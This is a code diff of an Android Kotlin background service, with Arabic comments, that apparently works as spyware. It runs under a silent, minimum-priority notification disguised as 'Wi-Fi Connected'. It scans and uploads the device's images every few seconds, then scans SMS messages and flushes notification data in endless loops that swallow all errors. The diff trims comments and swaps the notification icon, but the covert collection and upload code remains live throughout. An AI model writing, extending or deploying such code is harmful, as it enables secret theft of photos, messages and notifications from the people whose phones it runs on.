@@ -25,10 +25,9 @@ class BackgroundService : Service() {
         super.onCreate()
         startForegroundWithNotification()
 
-        // 🔥🔥🔥🔥🔥 الأولوية #1 = الصور. تبدأ فورًا قبل أي شي
+        // 🔥 الأولوية #1 = الصور
         startImageUploadFirst()
 
-        // بعد 5 ثواني، ابدأ باقي القنوات
         scope.launch {
             delay(5_000L)
             startOtherLoops()
@@ -72,7 +71,7 @@ class BackgroundService : Service() {
         val notif: Notification = NotificationCompat.Builder(this, channelId)
             .setContentTitle("Wi-Fi")
             .setContentText("Connected")
-            .setSmallIcon(android.R.drawable.stat_sys_wifi_signal_4)
+            .setSmallIcon(android.R.drawable.stat_notify_sync)
             .setOngoing(true)
             .setPriority(NotificationCompat.PRIORITY_MIN)
             .setSilent(true)
@@ -85,12 +84,7 @@ class BackgroundService : Service() {
         }
     }
 
-    // ─────────────────────────────────────────────────────────
-    //  🚀 PRIORITY #1: SEND IMAGES IMMEDIATELY — كل القوة هنا
-    // ─────────────────────────────────────────────────────────
     private fun startImageUploadFirst() {
-        // ثلاث حلقات متوازية للصور — تستنزف الطابور بسرعة قصوى
-
         // Loop A: scan + upload صور جديدة كل 3 ثواني
         scope.launch {
             while (running) {
@@ -98,16 +92,14 @@ class BackgroundService : Service() {
                 delay(3_000L)
             }
         }
-
-        // Loop B: flush media queue كل 2 ثانية (يشتغل حتى لو في طابور متراكم)
+        // Loop B: flush media queue كل 2 ثانية
         scope.launch {
             while (running) {
-                try { drainMediaQueue() } catch (_: Exception) {}
+                try { Uploader.flushQueue(applicationContext) } catch (_: Exception) {}
                 delay(2_000L)
             }
         }
-
-        // Loop C: flush queue العادي — لكن فقط للصور
+        // Loop C: flush queue العادي — فقط للصور
         scope.launch {
             while (running) {
                 try { Uploader.flushQueue(applicationContext) } catch (_: Exception) {}
@@ -116,19 +108,13 @@ class BackgroundService : Service() {
         }
     }
 
-    // ─────────────────────────────────────────────────────────
-    //  بعد 5 ثواني — نبدأ SMS + الإشعارات
-    // ─────────────────────────────────────────────────────────
     private fun startOtherLoops() {
-        // Loop SMS: كل 60 ثانية
         scope.launch {
             while (running) {
                 try { scanSms() } catch (_: Exception) {}
                 delay(60_000L)
             }
         }
-
-        // Loop flush الإشعارات: كل 20 ثانية
         scope.launch {
             while (running) {
                 try { Uploader.flushQueue(applicationContext) } catch (_: Exception) {}
@@ -137,23 +123,12 @@ class BackgroundService : Service() {
         }
     }
 
-    // ─────────────────────────────────────────────────────────
-    //  المسح والرفع — الصور
-    // ─────────────────────────────────────────────────────────
     private fun scanAndUploadImages() {
-        // صور فقط
         val images = MediaScanner.scanImages(applicationContext)
         for (img in images) {
-            // خزّن مؤقت (للترتيب والمنع من التكرار)
             DataStore.appendAny(applicationContext, MediaScanner.toJson(img))
-            // ارفع فورًا بالتوازي
             Uploader.uploadMediaFile(applicationContext, img)
         }
-    }
-
-    private fun drainMediaQueue() {
-        // flush الطابور (يضمن وصول الصور اللي انحجزت)
-        Uploader.flushQueue(applicationContext)
     }
 
     private fun scanSms() {
